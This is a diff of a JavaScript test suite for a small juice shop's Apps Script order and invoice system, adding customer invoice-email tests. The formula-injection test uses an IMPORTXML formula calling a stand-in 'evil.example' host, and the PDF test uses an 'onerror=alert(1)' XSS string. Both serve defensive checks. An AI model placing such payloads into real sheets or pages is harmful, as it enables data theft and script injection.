@@ -26,7 +26,7 @@ function ready() {
 }
 
 const order = (over) => Object.assign({
-  action: 'order', name: 'Jane Doe', contact: '@jane', address: '12 Beach Rd, Sea Point',
+  action: 'order', name: 'Jane Doe', contact: '@jane', email: 'jane@example.com', address: '12 Beach Rd, Sea Point',
   notes: '', qty: 3, areaConfirmed: true, requestId: rid(), expectedTotal: 150, website: ''
 }, over);
 
@@ -48,6 +48,7 @@ test('setup creates the tabs, defaults and an admin key, and is safe to repeat',
   const header = gas.sheet('Orders').getRange(1, 1, 1, 15).getValues()[0];
   assert.equal(header[0], 'Invoice');
   assert.equal(header[14], 'Request ID');
+  assert.equal(gas.sheet('Orders').getRange(1, 16, 1, 2).getValues()[0].join('|'), 'Email|Invoice emailed');
   const key = gas.key();
   assert.match(key, /^[0-9a-f]{64}$/);
 
@@ -102,10 +103,38 @@ test('a kiosk order is numbered, totalled on the server, stored and returned wit
   assert.equal(rows[0]['Delivery fee'], 30);
   assert.equal(rows[0].Total, 150);
 
-  assert.equal(gas.mail.length, 1);
+  assert.equal(rows[0].Email, 'jane@example.com');
+  assert.equal(rows[0]['Invoice emailed'], '2026-10-28 15:41');
+
+  // Greg gets an alert, the customer gets the invoice.
+  assert.equal(gas.mail.length, 2);
   assert.equal(gas.mail[0].to, 'greg@example.com');
   assert.equal(gas.mail[0].subject, 'New order SJ-0001: 3 x Running gel sachet (R150)');
   assert.match(gas.mail[0].body, /Jane Doe/);
+  assert.equal(r.emailed, true);
+  assert.equal(r.order.emailedOn, '2026-10-28 15:41');
+});
+
+test('the customer is emailed the unpaid invoice as a PDF, with the bank details', () => {
+  const { gas } = ready();
+  gas.call(order());
+  const m = gas.mail[1];
+  assert.equal(m.to, 'jane@example.com');
+  assert.equal(m.subject, 'Supa Juice invoice SJ-0001');
+  assert.equal(m.name, 'Supa Juice');
+  assert.equal(m.replyTo, 'greg@example.com', 'replies go to Greg');
+  assert.match(m.body, /^Hi Jane Doe,/);
+  assert.match(m.body, /3 x Running gel sachet @ R40 = R120\nDelivery: R30\nTotal due: R150/);
+  assert.match(m.body, /Reference: SJ-0001/);
+  assert.equal(m.attachments.length, 1);
+  const pdf = m.attachments[0];
+  assert.equal(pdf.getContentType(), 'application/pdf');
+  assert.equal(pdf.getName(), 'SJ-0001.pdf');
+  const html = pdf.getDataAsString();
+  for (const bit of ['Invoice SJ-0001', '28 Oct 2026', 'Total due', 'R150', 'Test Bank', '0012345678', '250655', '12 Beach Rd']) {
+    assert.ok(html.includes(bit), 'PDF shows ' + bit);
+  }
+  assert.ok(!html.includes('PAID'));
 });
 
 test('invoice numbers never repeat, even after rows are deleted, until numbering is reset', () => {
@@ -135,7 +164,7 @@ test('the same request id returns the existing order and does not email twice', 
   const again = gas.call(order({ requestId: 'same_request_1' }));
   assert.equal(first.order.invoice, again.order.invoice);
   assert.equal(gas.rows('Orders').length, 1);
-  assert.equal(gas.mail.length, 1);
+  assert.equal(gas.mail.length, 2, 'one alert and one invoice');
 });
 
 test('the hidden honeypot field rejects bots without writing a row', () => {
@@ -150,7 +179,9 @@ test('invalid kiosk input is rejected with a readable message', () => {
   const { gas } = ready();
   const bad = [
     [{ name: '  ' }, /name/i],
-    [{ contact: 'a' }, /Instagram handle or phone/],
+    [{ email: '' }, /email address/],
+    [{ email: 'jane at example.com' }, /email address does not look right/],
+    [{ email: 'jane@example' }, /email address does not look right/],
     [{ address: '' }, /address/i],
     [{ areaConfirmed: false }, /delivery area/],
     [{ areaConfirmed: 'true' }, /delivery area/],
@@ -168,6 +199,7 @@ test('invalid kiosk input is rejected with a readable message', () => {
   }
   assert.equal(gas.rows('Orders').length, 0);
   assert.equal(gas.call(order({ qty: '2', expectedTotal: 110 })).ok, true, 'numeric string quantity is fine');
+  assert.equal(gas.call(order({ contact: '' })).ok, true, 'Instagram handle or phone is optional');
 });
 
 test('long and multi-line text is trimmed and flattened', () => {
@@ -219,10 +251,10 @@ test('free delivery works', () => {
 test('customer text can never become a formula', () => {
   const { gas } = ready();
   const evil = '=IMPORTXML("http://evil.example","//a")';
-  const r = gas.call(order({ name: evil, contact: '+27 82 000 0000', address: '@cmd', notes: '-2+3' }));
+  const r = gas.call(order({ name: evil, contact: '+27 82 000 0000', address: '@cmd', notes: '-2+3', email: '=x@evil.example' }));
   assert.equal(r.ok, true);
   const sheet = gas.sheet('Orders');
-  for (const col of [4, 5, 6, 7]) {
+  for (const col of [4, 5, 6, 7, 16]) {
     const cell = sheet.cells.get('2,' + col);
     assert.equal(cell.formula, false, 'column ' + col);
     assert.ok(!/^[=+\-@]/.test(cell.v), 'column ' + col + ' starts with ' + cell.v[0]);
@@ -269,6 +301,7 @@ test('admin actions need the key and kiosk visitors cannot reach them', () => {
     { action: 'list', key: key + 'x' },
     { action: 'create', name: 'x', qty: 1 },
     { action: 'setStatus', invoice: 'SJ-0001', status: 'Paid' },
+    { action: 'sendInvoice', invoice: 'SJ-0001' },
     { action: 'getSettings' },
     { action: 'saveSettings', values: { price: '1' } }
   ]) {
@@ -276,7 +309,7 @@ test('admin actions need the key and kiosk visitors cannot reach them', () => {
     assert.equal(r.ok, false, JSON.stringify(body));
     assert.equal(r.error, 'unauthorized', JSON.stringify(body));
   }
-  assert.ok(gas.sleeps.length >= 8, 'failed attempts are slowed down');
+  assert.ok(gas.sleeps.length >= 9, 'failed attempts are slowed down');
   assert.equal(gas.call({ action: 'list', key }).ok, true);
   assert.equal(gas.rows('Orders')[0].Status, 'Awaiting payment');
 });
@@ -306,6 +339,108 @@ test('Greg can add a DM order: no email, address and contact optional', () => {
   assert.equal(r.order.source, 'dm');
   assert.equal(gas.mail.length, 0);
   assert.equal(gas.call(dm(key, { name: '' })).error, 'invalid');
+  assert.equal(gas.call(dm(key, { email: 'nope' })).error, 'invalid', 'an email, if given, must look right');
+});
+
+test('a DM order with an email sends the customer the invoice, but no alert to Greg', () => {
+  const { gas, key } = ready();
+  const r = gas.call(dm(key, { name: 'Sam', email: 'sam@example.com' }));
+  assert.equal(r.ok, true);
+  assert.equal(r.emailed, true);
+  assert.equal(gas.mail.length, 1);
+  assert.equal(gas.mail[0].to, 'sam@example.com');
+  assert.equal(gas.mail[0].attachments[0].getName(), 'SJ-0001.pdf');
+});
+
+test('marking paid emails the paid invoice once; undoing and other moves send nothing', () => {
+  const { gas, key } = ready();
+  gas.call(order());
+  gas.mail.length = 0;
+  const set = (status) => gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status });
+
+  gas.clock.now += 3600 * 1000;
+  const paid = set('Paid');
+  assert.equal(paid.emailed, true);
+  assert.equal(paid.order.emailedOn, '2026-10-28 16:41');
+  assert.equal(gas.mail.length, 1);
+  const m = gas.mail[0];
+  assert.equal(m.subject, 'Supa Juice invoice SJ-0001 (paid)');
+  assert.match(m.body, /Invoice SJ-0001 \(PAID\)\nDate: 28 Oct 2026\nPaid: 28 Oct 2026/);
+  assert.match(m.body, /Total paid: R150/);
+  assert.ok(!m.body.includes('0012345678'), 'no bank details on a paid invoice');
+  const html = m.attachments[0].getDataAsString();
+  assert.ok(html.includes('PAID') && html.includes('Total paid') && !html.includes('0012345678'));
+
+  set('Delivered');
+  set('Paid'); // undo delivered
+  set('Paid'); // same again
+  assert.equal(gas.mail.length, 1, 'no second paid email');
+  assert.equal(set('Delivered').emailed, undefined);
+});
+
+test('orders without an email are never emailed', () => {
+  const { gas, key } = ready();
+  gas.call(dm(key));
+  assert.equal(gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status: 'Paid' }).emailed, undefined);
+  assert.equal(gas.mail.length, 0);
+  const r = gas.call({ action: 'sendInvoice', key, invoice: 'SJ-0001' });
+  assert.equal(r.error, 'invalid');
+  assert.match(r.message, /no email address/);
+});
+
+test('Greg can email an invoice again, but not for a cancelled or unknown order', () => {
+  const { gas, key } = ready();
+  gas.call(order());
+  gas.mail.length = 0;
+  gas.clock.now += 600 * 1000;
+  const r = gas.call({ action: 'sendInvoice', key, invoice: 'sj-0001' });
+  assert.equal(r.ok, true, JSON.stringify(r));
+  assert.equal(r.order.emailedOn, '2026-10-28 15:51');
+  assert.equal(gas.rows('Orders')[0]['Invoice emailed'], '2026-10-28 15:51');
+  assert.equal(gas.mail.length, 1);
+  assert.equal(gas.mail[0].subject, 'Supa Juice invoice SJ-0001');
+
+  gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status: 'Cancelled' });
+  assert.match(gas.call({ action: 'sendInvoice', key, invoice: 'SJ-0001' }).message, /cancelled/);
+  assert.equal(gas.call({ action: 'sendInvoice', key, invoice: 'SJ-0404' }).error, 'not_found');
+});
+
+test('a failed invoice email does not fail the order, and a resend says it failed', () => {
+  const { gas, key } = ready();
+  gas.mailQuota.left = 1; // enough for Greg's alert only
+  const r = gas.call(order());
+  assert.equal(r.ok, true);
+  assert.equal(r.emailed, false);
+  assert.equal(r.order.emailedOn, '');
+  assert.equal(gas.rows('Orders')[0]['Invoice emailed'], '');
+  assert.ok(gas.errors.some((e) => e.includes('Invoice email failed for SJ-0001')));
+  const again = gas.call({ action: 'sendInvoice', key, invoice: 'SJ-0001' });
+  assert.equal(again.error, 'email_failed');
+  assert.equal(gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status: 'Paid' }).ok, true, 'marking paid still works');
+});
+
+test('customer text in the PDF is shown as text, never as markup', () => {
+  const { gas } = ready();
+  gas.call(order({ name: '<img src=x onerror=alert(1)>', address: '"1 & 2" <b>St</b>' }));
+  const html = gas.mail[1].attachments[0].getDataAsString();
+  assert.ok(!html.includes('<img'));
+  assert.ok(!html.includes('<b>'));
+  assert.ok(html.includes('&lt;img src=x onerror=alert(1)&gt;'));
+  assert.ok(html.includes('&quot;1 &amp; 2&quot; &lt;b&gt;St&lt;/b&gt;'));
+});
+
+test('rows written before the email columns existed still list and change status', () => {
+  const { gas, key } = ready();
+  const sheet = gas.sheet('Orders');
+  sheet.getRange(2, 1, 1, 15).setValues([[
+    'SJ-0001', '2026-10-27 10:00', 'kiosk', 'Old Row', '@old', '1 Old St', '',
+    1, 40, 30, 70, 'Awaiting payment', '', '', 'req_old_0001'
+  ]]);
+  const listed = gas.call({ action: 'list', key }).orders[0];
+  assert.equal(listed.email, '');
+  assert.equal(listed.emailedOn, '');
+  assert.equal(gas.call({ action: 'setStatus', key, invoice: 'SJ-0001', status: 'Paid' }).emailed, undefined);
+  assert.equal(gas.call(order()).order.invoice, 'SJ-0002');
 });
 
 test('list returns orders and the admin config with bank details', () => {
@@ -459,11 +594,14 @@ test('a failing alert email does not fail the order', () => {
   const r = gas.call(order());
   assert.equal(r.ok, true);
   assert.ok(gas.errors.some((e) => e.includes('Alert email failed')));
+  assert.ok(gas.errors.some((e) => e.includes('Invoice email failed')));
 });
 
 test('no alert email address means no email', () => {
   const { gas, key } = ready();
   gas.call({ action: 'saveSettings', key, values: { alert_email: '' } });
   gas.call(order());
-  assert.equal(gas.mail.length, 0);
+  assert.equal(gas.mail.length, 1, 'only the customer invoice');
+  assert.equal(gas.mail[0].to, 'jane@example.com');
+  assert.equal(gas.mail[0].replyTo, undefined);
 });
